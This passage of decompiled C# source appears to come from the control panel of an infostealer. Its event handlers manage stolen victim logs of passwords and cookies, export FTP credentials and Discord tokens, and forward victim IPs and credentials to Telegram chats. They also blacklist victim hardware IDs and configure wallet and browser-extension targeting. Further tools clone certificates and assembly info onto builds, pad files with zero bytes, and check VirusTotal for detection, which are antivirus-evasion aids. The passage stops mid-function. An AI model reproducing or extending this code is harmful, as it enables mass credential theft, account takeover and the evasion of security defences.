                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
                MessageBox.Show(this, $"Removed {bindingList.Count} empty logs");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        ((MetroSetButton)singleSort).Enabled = true;
        ((MetroSetButton)e9).Enabled = true;
        ((MetroSetButton)e8).Enabled = true;
        ((MetroSetButton)ee).Enabled = true;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
    }

    private async void e8_Click(object sender, object e)
    {
        ((MetroSetButton)singleSort).Enabled = false;
        ((MetroSetButton)e9).Enabled = false;
        ((MetroSetButton)e8).Enabled = false;
        ((MetroSetButton)ee).Enabled = false;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
        await Task.Factory.StartNew(delegate
        {
            try
            {
                LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
                LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
                UserLog[] source;
                lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
                {
                    source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
                }
                BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Checked) };
                foreach (UserLog newLog in bindingList)
                {
                    LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
                }
                LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
                LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
                LazyLoader<UserLogsDb>.Instance.PageController.Clear();
                LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
                MessageBox.Show(this, $"Removed {bindingList.Count} checked logs");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
        ((MetroSetButton)singleSort).Enabled = true;
        ((MetroSetButton)e9).Enabled = true;
        ((MetroSetButton)e8).Enabled = true;
        ((MetroSetButton)ee).Enabled = true;
    }

    private async void ec_Click(object sender, object e)
    {
        DataGridViewRow dataGridViewRow = ((DataGridView)logsListView).SelectedRows[0];
        int selectedItem = (int)dataGridViewRow.Cells[0].Value;
        ((DataGridView)logsListView).GetCellDisplayRectangle(9, dataGridViewRow.Index, cutOverflow: true);
        await Task.Factory.StartNew(delegate
        {
            try
            {
                UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(selectedItem);
                List<string> list = new List<string>();
                lock (settingsLock)
                {
                    list = ((RemoteClientSettings.DDPatterns == null) ? new List<string>() : RemoteClientSettings.DDPatterns.Cast<string>().ToList());
                }
                List<string> list2 = new List<string>();
                List<string> list3 = new List<string>();
                string empty = string.Empty;
                foreach (string item in list)
                {
                    try
                    {
                        string[] links = item.Split('=')[1].Split('|');
                        foreach (string item2 in userLog.PasswordContains(links).IsNull(new List<string>()))
                        {
                            list2.Add("[" + item.Split('=')[0] + "] " + item2);
                        }
                        foreach (string item3 in userLog.CookiesContains(links).IsNull(new List<string>()))
                        {
                            list3.Add("[" + item.Split('=')[0] + "] " + item3);
                        }
                    }
                    catch
                    {
                    }
                }
                list2 = (from x in list2.Distinct()
                         where !string.IsNullOrWhiteSpace(x)
                         select x).ToList();
                list3 = (from x in list3.Distinct()
                         where !string.IsNullOrWhiteSpace(x)
                         select x).ToList();
                if (list2.Count() == 0)
                {
                    empty = empty + "PDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
                }
                else
                {
                    empty = empty + "PDD: " + Environment.NewLine;
                    foreach (string item4 in list2)
                    {
                        empty = empty + item4 + ", ";
                    }
                    empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
                }
                if (list3.Count() != 0)
                {
                    empty = empty + "CDD: " + Environment.NewLine;
                    foreach (string item5 in list3)
                    {
                        empty = empty + item5 + ", ";
                    }
                    empty = empty.TrimEnd(',', ' ') + Environment.NewLine;
                }
                else
                {
                    empty = empty + "CDD: NOT FOUND" + Environment.NewLine + Environment.NewLine;
                }
                userLog = default(UserLog);
                MessageBox.Show(this, empty, "Domain Detect Viewer");
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
    }

    private async void ee_Click(object sender, object e)
    {
        ((MetroSetButton)singleSort).Enabled = false;
        ((MetroSetButton)e9).Enabled = false;
        ((MetroSetButton)e8).Enabled = false;
        ((MetroSetButton)ee).Enabled = false;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
        SingleSearchParams singleSearch = new SingleSearchParams
        {
            SaveFtps = true,
            LogFrom = ((DateTimePicker)d5).Value,
            LogTo = ((DateTimePicker)d6).Value
        };
        await Task.Factory.StartNew(delegate
        {
            try
            {
                FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                {
                    InitialDirectory = Directory.GetCurrentDirectory(),
                    Title = "Choose directory to save ftps"
                };
                if (folderSelectDialog.Show(base.Handle))
                {
                    LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
                    logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate (int index, int total)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            ((Control)singleStatusLbl).Text = $"{index} / {total}";
                        });
                    });
                    logSorter.Sort();
                    Invoke((MethodInvoker)delegate
                    {
                        ((Control)singleStatusLbl).Text = "Waiting";
                    });
                    MessageBox.Show(this, "Success");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        ((MetroSetButton)singleSort).Enabled = true;
        ((MetroSetButton)e9).Enabled = true;
        ((MetroSetButton)e8).Enabled = true;
        ((MetroSetButton)ee).Enabled = true;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
    }

    private async void fa_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)fe).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private void fb_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)fc).Text))
        {
            MessageBox.Show(this, "Please enter a HWID");
            return;
        }
        ((ListBox)fe).Items.Add(((AnimaTextBox)fc).Text);
        ((AnimaTextBox)fc).Text = string.Empty;
    }

    private async void blockHwidtoolStripMenuItem8_Click(object sender, object e)
    {
        try
        {
            if (((DataGridView)logsListView).SelectedRows.Count <= 0)
            {
                return;
            }
            object enumerator = ((DataGridView)logsListView).SelectedRows.GetEnumerator();
            try
            {
                while (((IEnumerator)enumerator).MoveNext())
                {
                    DataGridViewRow dataGridViewRow = (DataGridViewRow)((IEnumerator)enumerator).Current;
                    int selectedItem = (int)dataGridViewRow.Cells[0].Value;
                    await Task.Factory.StartNew(delegate
                    {
                        try
                        {
                            UserLog userLog = LazyLoader<UserLogsDb>.Instance.Find((UserLog x) => x.ID == selectedItem);
                            Invoke((MethodInvoker)delegate
                            {
                                ((ListBox)fe).Items.Add(userLog.HWID);
                            });
                            lock (settingsLock)
                            {
                                RemoteClientSettings.BlacklistedHWID.Add(userLog.HWID);
                            }
                            userLog = default(UserLog);
                        }
                        catch
                        {
                        }
                    });
                    lock (settingsLock)
                    {
                        RemoteClientSettings.SaveSettings();
                    }
                }
            }
            finally
            {
                if (enumerator is IDisposable disposable)
                {
                    disposable.Dispose();
                }
            }
            MessageBox.Show(this, "Successfully blocked");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void blackListCms_6_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)fe).SelectedItems.Count == 0;
    }

    private void toolStripMenuItem8_Click(object sender, object e)
    {
        ((ListBox)fe).Items.RemoveAt(((ListControl)fe).SelectedIndex);
    }

    private void logsListView_SelectionChanged(object sender, object e)
    {
        try
        {
            int count = ((DataGridView)logsListView).SelectedRows?.Count ?? 0;
            Invoke((MethodInvoker)delegate
            {
                ((Control)totalSelectedLogs).Text = count.ToString();
            });
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void removeRecipientIdBtn_Click(object sender, object e)
    {
        try
        {
            if (((ListBox)recipientsIdsListBox).SelectedItems.Count == 0)
            {
                MessageBox.Show(this, "Select recipient to remove");
                return;
            }
            lock (((TelegramChatsDb)this.e).RootLocker)
            {
                ((TelegramChatsDb)this.e).chatsSettings.RemoveAt(((ListControl)recipientsIdsListBox).SelectedIndex);
                ((TelegramChatsDb)this.e).SaveSettings();
            }
            UpdateRecipients();
            MessageBox.Show(this, "Successfully removed");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void configRecipientIdBtn_Click(object sender, object e)
    {
        try
        {
            if (((ListBox)recipientsIdsListBox).SelectedItems.Count == 0)
            {
                MessageBox.Show(this, "Select recipient to configurate");
                return;
            }
            TelegramChatSettings chatSettings = new TelegramChatSettings();
            lock (((TelegramChatsDb)this.e).RootLocker)
            {
                chatSettings = ((TelegramChatsDb)this.e).chatsSettings[((ListControl)recipientsIdsListBox).SelectedIndex];
            }
            TelegramConfigurator telegramConfigurator = new TelegramConfigurator(chatSettings);
            if (telegramConfigurator.ShowDialog(this) == DialogResult.OK)
            {
                lock (((TelegramChatsDb)this.e).RootLocker)
                {
                    ((TelegramChatsDb)this.e).chatsSettings[((ListControl)recipientsIdsListBox).SelectedIndex] = telegramConfigurator.CurrentChatSettings;
                    ((TelegramChatsDb)this.e).SaveSettings();
                }
                MessageBox.Show(this, "Successfully configurated");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void saveDiscordTokensBtn_Click(object sender, object e)
    {
        ((MetroSetButton)singleSort).Enabled = false;
        ((MetroSetButton)e9).Enabled = false;
        ((MetroSetButton)e8).Enabled = false;
        ((MetroSetButton)ee).Enabled = false;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = false;
        SingleSearchParams singleSearch = new SingleSearchParams
        {
            SaveDisordTokens = true,
            LogFrom = ((DateTimePicker)d5).Value,
            LogTo = ((DateTimePicker)d6).Value
        };
        await Task.Factory.StartNew(delegate
        {
            try
            {
                FolderSelectDialog folderSelectDialog = new FolderSelectDialog
                {
                    InitialDirectory = Directory.GetCurrentDirectory(),
                    Title = "Choose directory to save ftps"
                };
                if (folderSelectDialog.Show(base.Handle))
                {
                    LogSorter logSorter = new LogSorter(folderSelectDialog.FileName, singleSearch);
                    logSorter.OnIndexChanged = (CurrentIndexChangedEventHandler)Delegate.Combine(logSorter.OnIndexChanged, (CurrentIndexChangedEventHandler)delegate (int index, int total)
                    {
                        Invoke((MethodInvoker)delegate
                        {
                            ((Control)singleStatusLbl).Text = $"{index} / {total}";
                        });
                    });
                    logSorter.Sort();
                    Invoke((MethodInvoker)delegate
                    {
                        ((Control)singleStatusLbl).Text = "Waiting";
                    });
                    MessageBox.Show(this, "Success");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.ToString());
            }
        });
        ((MetroSetButton)singleSort).Enabled = true;
        ((MetroSetButton)e9).Enabled = true;
        ((MetroSetButton)e8).Enabled = true;
        ((MetroSetButton)ee).Enabled = true;
        ((MetroSetButton)saveDiscordTokensBtn).Enabled = true;
    }

    private async void addRecipientIdBtn_Click(object sender, object e)
    {
        try
        {
            List<string> list = new List<string>();
            string text = Interaction.InputBox("Enter a chat id:", "Meta Config", string.Empty);
            if (string.IsNullOrWhiteSpace(text))
            {
                return;
            }
            lock (((TelegramChatsDb)this.e).RootLocker)
            {
                IEnumerable<string> enumerable = ((TelegramChatsDb)this.e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString());
                List<string> list2;
                if (enumerable != null)
                {
                    list2 = enumerable.ToList();
                    if (list2 != null)
                    {
                        goto IL_0093;
                    }
                }
                list2 = new List<string>();
                goto IL_0093;
            IL_0093:
                list = list2;
            }
            if (!list.Contains(text))
            {
                lock (((TelegramChatsDb)this.e).RootLocker)
                {
                    if (CountOfChats() <= ((TelegramChatsDb)this.e).chatsSettings.Count)
                    {
                        MessageBox.Show(this, "Maximum number of chats has been added");
                    }
                    else
                    {
                        ((TelegramChatsDb)this.e).chatsSettings.Add(new TelegramChatSettings
                        {
                            ChatId = Convert.ToInt64(text),
                            MessageFormat = "Номер: {ID}\r\nБилд: {BuildID}\r\nОС: {OS}\r\nIP: {IP}\r\nДанные: {Creds}\r\nСтрана: {Country}",
                            SendingMode = SendingMode.NoAttachments,
                            SearchParams = new SingleSearchParams
                            {
                                LogFrom = DateTime.MinValue,
                                LogTo = DateTime.MaxValue
                            }
                        });
                        ((TelegramChatsDb)this.e).SaveSettings();
                    }
                }
                UpdateRecipients();
                MessageBox.Show(this, "Successfull added");
            }
            else
            {
                MessageBox.Show(this, "Already exist");
            }
        }
        catch (Exception arg)
        {
            MessageBox.Show(this, $"Error :{arg}");
        }
    }

    private void removeIdBlackListBtn_Click(object sender, object e)
    {
        try
        {
            if (((ListBox)blackListChatIds).SelectedItems.Count == 0)
            {
                MessageBox.Show(this, "Select recipient to remove");
                return;
            }
            ((ListBox)blackListChatIds).Items.RemoveAt(((ListControl)blackListChatIds).SelectedIndex);
            if (((ListBox)blackListChatIds).Items.Count <= 0)
            {
                if (System.IO.File.Exists("blackListChats.ini"))
                {
                    System.IO.File.Delete("blackListChats.ini");
                }
            }
            else
            {
                System.IO.File.WriteAllLines("blackListChats.ini", ((ListBox)blackListChatIds).Items.Cast<string>().ToArray());
            }
            MessageBox.Show(this, "Successfully removed");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void addIdBlackListBtn_Click(object sender, object e)
    {
        try
        {
            List<string> list = new List<string>();
            string newValue = Interaction.InputBox("Enter a chat id:", "Meta Config", string.Empty);
            if (string.IsNullOrWhiteSpace(newValue))
            {
                return;
            }
            if (((ListBox)blackListChatIds).SelectedItems.Count > 0)
            {
                list.AddRange(((ListBox)blackListChatIds).Items.Cast<string>());
            }
            if (list.Contains(newValue))
            {
                MessageBox.Show(this, "Already exist");
                return;
            }
            Invoke((MethodInvoker)delegate
            {
                ((ListBox)blackListChatIds).Items.Add(newValue);
            });
            System.IO.File.AppendAllText("blackListChats.ini", newValue + Environment.NewLine);
            MessageBox.Show(this, "Successfull added");
        }
        catch (Exception arg)
        {
            MessageBox.Show(this, $"Error :{arg}");
        }
    }

    private async void importCountries_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)blackListLb).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private void blackListCms_7_Opening(object sender, object e)
    {
        ((CancelEventArgs)e).Cancel = ((ListBox)blackListBuildsLb).SelectedItems.Count == 0;
    }

    private void toolStripMenuItem9_Click(object sender, object e)
    {
        ((ListBox)blackListBuildsLb).Items.RemoveAt(((ListControl)blackListBuildsLb).SelectedIndex);
    }

    private async void importBuilds_Click(object sender, object e)
    {
        await Task.Factory.StartNew(delegate
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog();
                try
                {
                    ofd.Filter = "Txt files (*.txt)|*.txt";
                    ofd.CheckPathExists = true;
                    ofd.InitialDirectory = Directory.GetCurrentDirectory();
                    ofd.RestoreDirectory = true;
                    ofd.Multiselect = false;
                    Invoke((MethodInvoker)delegate
                    {
                        if (ofd.ShowDialog(this) == DialogResult.OK)
                        {
                            string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                            foreach (string item in array)
                            {
                                ((ListBox)blackListBuildsLb).Items.Add(item);
                            }
                        }
                    });
                }
                finally
                {
                    if (ofd != null)
                    {
                        ((IDisposable)ofd).Dispose();
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(this, "Error: " + ex.Message);
            }
        });
    }

    private void addBlackBuildBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)blackBuildIdTb).Text))
        {
            MessageBox.Show(this, "Please enter a build id");
            return;
        }
        ((ListBox)blackListBuildsLb).Items.Add(((AnimaTextBox)blackBuildIdTb).Text);
        ((AnimaTextBox)blackBuildIdTb).Text = string.Empty;
    }

    private async void autoStartTelegramCb_CheckedChanged(object sender, object e)
    {
        try
        {
            lock (settingsLock)
            {
                RemoteClientSettings.AutoStart = ((MetroSetCheckBox)autoStartTelegramCb).Checked;
                RemoteClientSettings.SaveSettings();
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void metroSetButton4_Click(object sender, object e)
    {
        try
        {
            if (new WalletsConfigurator().ShowDialog(this) == DialogResult.OK)
            {
                MessageBox.Show(this, "Successfully configurated");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    private async void showCreatorKeyBtn_Click(object sender, object e)
    {
        try
        {
            if (((Control)showCreatorKeyBtn).Text == "Hide")
            {
                ((AnimaTextBox)privateCreatorKeyTb).Text = "*********";
                ((Control)showCreatorKeyBtn).Text = "Show";
            }
            else if (ProfileSettings.CreatorActivated)
            {
                string text = Interaction.InputBox("Enter an account password:", "Verification", null);
                if (!string.IsNullOrWhiteSpace(text))
                {
                    if (text == ProfileSettings.Password)
                    {
                        ((AnimaTextBox)privateCreatorKeyTb).Text = ProfileSettings.Token;
                        ((Control)showCreatorKeyBtn).Text = "Hide";
                    }
                    else
                    {
                        MessageBox.Show(this, "Incorrect password");
                    }
                }
            }
            else
            {
                MessageBox.Show(this, "You have to buy 'Creator' feature to see private key");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private async void addNewBrowserExtBtn_Click(object sender, object e)
    {
        if (string.IsNullOrWhiteSpace(((AnimaTextBox)newBrowserExtTb).Text))
        {
            MessageBox.Show(this, "Please enter an extension path.");
            return;
        }
        if (((AnimaTextBox)newBrowserExtTb).Text.Split('|').Length == 0)
        {
            MessageBox.Show(this, "Invalid format of text. Format:  ExtensionDirectoryName|NameOfExtension");
        }
        ((ListBox)browsersExtensionsListBox).Items.Add(((AnimaTextBox)newBrowserExtTb).Text);
        ((AnimaTextBox)newBrowserExtTb).Text = string.Empty;
    }

    private async void toolStripMenuItem10_Click(object sender, object e)
    {
        try
        {
            string text = Interaction.InputBox("Edit value:", "Meta Edit", ((ListBox)browsersExtensionsListBox).Items[((ListControl)browsersExtensionsListBox).SelectedIndex].ToString());
            if (!string.IsNullOrWhiteSpace(text) && ((ListBox)browsersExtensionsListBox).Items[((ListControl)browsersExtensionsListBox).SelectedIndex].ToString() != text)
            {
                ((ListBox)browsersExtensionsListBox).Items[((ListControl)browsersExtensionsListBox).SelectedIndex] = text;
                MessageBox.Show(this, "Successfully");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void toolStripMenuItem11_Click(object sender, object e)
    {
        try
        {
            ((ListBox)browsersExtensionsListBox).Items.RemoveAt(((ListControl)browsersExtensionsListBox).SelectedIndex);
        }
        catch
        {
        }
    }

    private async void resetDefaultSettingBtn_Click(object sender, object e)
    {
        try
        {
            RemoteClientSettings.SetDefault();
            LoadSettings();
        }
        catch
        {
        }
    }

    private void saveLogHeaderBtn_Click(object sender, object e)
    {
        try
        {
            if (ProfileSettings.HeaderActivated)
            {
                SettingsOfPanel.Default.LogHeader = ((AnimaTextBox)logsHeaderTb).Text;
                SettingsOfPanel.Default.Save();
                MessageBox.Show(this, "Ok");
            }
            else
            {
                MessageBox.Show(this, "You have to buy log header feature to change header.");
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void openBuildBtn_Click(object sender, object e)
    {
        ((AnimaTextBox)buildPathTb).Text = string.Empty;
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Multiselect = false;
        openFileDialog.RestoreDirectory = true;
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            ((AnimaTextBox)buildPathTb).Text = openFileDialog.FileName;
        }
    }

    private void openTargetBtn_Click(object sender, object e)
    {
        ((AnimaTextBox)targetPathTb).Text = string.Empty;
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Multiselect = false;
        openFileDialog.RestoreDirectory = true;
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            ((AnimaTextBox)targetPathTb).Text = openFileDialog.FileName;
        }
    }

    private async void cloneBtn_Click(object sender, object e)
    {
        if (!string.IsNullOrWhiteSpace(((AnimaTextBox)targetPathTb).Text))
        {
            if (!string.IsNullOrWhiteSpace(((AnimaTextBox)buildPathTb).Text))
            {
                if (!((MetroSetCheckBox)assemblyInfo).Checked && !((MetroSetCheckBox)certificate).Checked)
                {
                    MessageBox.Show(this, "You must to enable assembly info or certificate in settings");
                    return;
                }
                bool cert = ((MetroSetCheckBox)certificate).Checked;
                bool info = ((MetroSetCheckBox)assemblyInfo).Checked;
                await Task.Factory.StartNew(delegate
                {
                    try
                    {
                        if (info)
                        {
                            FileCopyCreator.CloneResources(((AnimaTextBox)targetPathTb).Text, ((AnimaTextBox)buildPathTb).Text);
                        }
                        if (cert)
                        {
                            FileCopyCreator.CloneCertificate(((AnimaTextBox)targetPathTb).Text, ((AnimaTextBox)buildPathTb).Text);
                        }
                        MessageBox.Show(this, "Done. Check your build file");
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(this, "Error: " + ex.Message);
                    }
                });
            }
            else
            {
                MessageBox.Show(this, "Choose build file");
            }
        }
        else
        {
            MessageBox.Show(this, "Choose target file");
        }
    }

    private void openPumpBtn_Click(object sender, object e)
    {
        ((AnimaTextBox)pumpPath).Text = string.Empty;
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Multiselect = false;
        openFileDialog.RestoreDirectory = true;
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            ((AnimaTextBox)pumpPath).Text = openFileDialog.FileName;
        }
    }

    private async void pumpBtn_Click(object sender, object e)
    {
        if (!string.IsNullOrWhiteSpace(((AnimaTextBox)pumpPath).Text))
        {
            if (string.IsNullOrWhiteSpace(((AnimaTextBox)bytesCount).Text))
            {
                MessageBox.Show(this, "Enter a valid count of bytes");
                return;
            }
            if (!long.TryParse(((AnimaTextBox)bytesCount).Text, out var result))
            {
                MessageBox.Show(this, "Enter a valid count of bytes");
                return;
            }
            if (result <= 0L)
            {
                MessageBox.Show(this, "Enter a valid count of bytes. Must be more then zero");
            }
            await Task.Factory.StartNew(delegate
            {
                try
                {
                    List<byte> list = System.IO.File.ReadAllBytes(((AnimaTextBox)pumpPath).Text).ToList();
                    for (int i = 0; i < result; i++)
                    {
                        list.Add(0);
                    }
                    System.IO.File.WriteAllBytes(((AnimaTextBox)pumpPath).Text, list.ToArray());
                    MessageBox.Show(this, "Done. Check your file");
                }
                catch (Exception ex)
                {
                    MessageBox.Show(this, "Error: " + ex.Message);
                }
            });
        }
        else
        {
            MessageBox.Show(this, "Choose a file to pump");
        }
    }

    private void openVirusTotalFile_Click(object sender, object e)
    {
        ((AnimaTextBox)virustotalFile).Text = string.Empty;
        using OpenFileDialog openFileDialog = new OpenFileDialog();
        openFileDialog.Multiselect = false;
        openFileDialog.RestoreDirectory = true;
        if (openFileDialog.ShowDialog() == DialogResult.OK)
        {
            ((AnimaTextBox)virustotalFile).Text = openFileDialog.FileName;
        }
    }

    public void RunVirustotalScan(string filename, string apikey)
    {
        while (intptr_1 != (IntPtr)0)
        {
            try
            {
                WebClient webClient = new WebClient();
                webClient.Headers.Add("x-apikey", apikey);
                webClient.DownloadString(" https://www.virustotal.com/api/v3/files/" + Md5Helper.GetSha256(System.IO.File.ReadAllBytes(filename)));
                MessageBox.Show(this, "WARNING. File detected on VIRUSTOTAL!!");
            }
            catch (Exception ex2)
            {
                Exception ex3 = ex2;
                Exception ex = ex3;
                Invoke((MethodInvoker)delegate
                {
                    AnimaTextBox animaTextBox = (AnimaTextBox)virusTotalTextbox;
                    animaTextBox.Text = animaTextBox.Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | " + ex.Message + Environment.NewLine;
                });
            }
            DateTime dateTime = DateTime.Now.AddMinutes(15.0);
            while (DateTime.Now < dateTime && intptr_1 != (IntPtr)0)
            {
                Thread.Sleep(100);
            }
        }
        Invoke((MethodInvoker)delegate
        {
            object obj = virusTotalTextbox;
            ((AnimaTextBox)obj).Text = ((AnimaTextBox)obj).Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | Stopped" + Environment.NewLine;
            ((MetroSetButton)metroSetButton3).Enabled = true;
            ((Control)metroSetButton3).Text = "Start";
        });
    }

    private void metroSetButton3_Click(object sender, object e)
    {
        if (((Control)metroSetButton3).Text == "Start")
        {
            if (!string.IsNullOrWhiteSpace(((AnimaTextBox)virustotalFile).Text) && !string.IsNullOrWhiteSpace(((AnimaTextBox)virusTotalKey).Text))
            {
                intptr_1 = (IntPtr)1;
                ((Control)metroSetButton3).Text = "Stop";
                string apikey = ((AnimaTextBox)virusTotalKey).Text;
                string file = ((AnimaTextBox)virustotalFile).Text;
                Task.Factory.StartNew(delegate
                {
                    RunVirustotalScan(file, apikey);
                });
            }
            else
            {
                MessageBox.Show(this, "Fill the data");
            }
        }
        else
        {
            ((Control)metroSetButton3).Text = "Stopping";
            ((MetroSetButton)metroSetButton3).Enabled = false;
            intptr_1 = (IntPtr)0;
        }
    }

    private void metroSetButton6_Click(object sender, object e)
    {
        try
        {
            if (((ListBox)fileToMergeLb).SelectedItems.Count == 0)
            {
                MessageBox.Show(this, "Select file to remove");
                return;
            }
            ((List<MergeFile>)object_9).RemoveAt(((ListControl)fileToMergeLb).SelectedIndex);
            ((ListBox)fileToMergeLb).Items.RemoveAt(((ListControl)fileToMergeLb).SelectedIndex);
            MessageBox.Show(this, "Successfully removed");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    private void metroSetButton1_Click(object sender, object e)
    {
        try
        {
            using MergeFilesConfigFrm mergeFilesConfigFrm = new MergeFilesConfigFrm();
            if (mergeFilesConfigFrm.ShowDialog() == DialogResult.OK)
            {
                ((List<MergeFile>)object_9).Add(mergeFilesConfigFrm.CurrentMergeFile);
                ((ListBox)fileToMergeLb).Items.Add(mergeFilesConfigFrm.CurrentMergeFile.FilePath);
            }
        }
        catch
        {
        }
    }

    private async void mergeBtn_Click(object sender, object e)
    {
        ((MetroSetButton)mergeBtn).Enabled = false;
        ((Control)mergeBtn).Text = "Building";
        await Task.Factory.StartNew(delegate
        {
        });
        ((Control)mergeBtn).Text = "Build";
        ((MetroSetButton)mergeBtn).Enabled = true;
    }

    private async void fileScanBtn_Click(object sender, object e)
    {
        ((MetroSetButton)fileScanBtn).Enabled = false;
        ((Control)fileScanBtn).Text = "Scanning";
        await Task.Factory.StartNew(delegate
        {
        });
        ((MetroSetButton)fileScanBtn).Enabled = true;
        ((Control)fileScanBtn).Text = "Scan";
    }

    private async void refreshCookiesBtn_Click(object sender, object e)
    {
        ((MetroSetButton)refreshCookiesBtn).Enabled = false;
        ((Control)refreshCookiesBtn).Text = "Processing..";
        string accountToken = ((AnimaTextBox)accessTokenTb).Text;
        if (string.IsNullOrWhiteSpace(accountToken))
        {
            MessageBox.Show(this, "Please, enter an account token.");
            ((Control)refreshCookiesBtn).Text = "Refresh";
            ((MetroSetButton)refreshCookiesBtn).Enabled = true;
            return;
        }
        await Task.Factory.StartNew(delegate
        {
            try
            {
                using SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Title = "Enter file name to save cookies";
                saveFileDialog.Filter = "Txt files (*.txt)|*.txt";
                saveFileDialog.DefaultExt = ".txt";
                saveFileDialog.CheckPathExists = true;
                saveFileDialog.InitialDirectory = Directory.GetCurrentDirectory();
                saveFileDialog.RestoreDirectory = true;
                if (saveFileDialog.ShowDialog(this) == DialogResult.OK)
                {
                    List<Meta.SharedModels.Cookie> list = CookieHelper.Refresh(accountToken);
                    if (list.Count > 0)
                    {
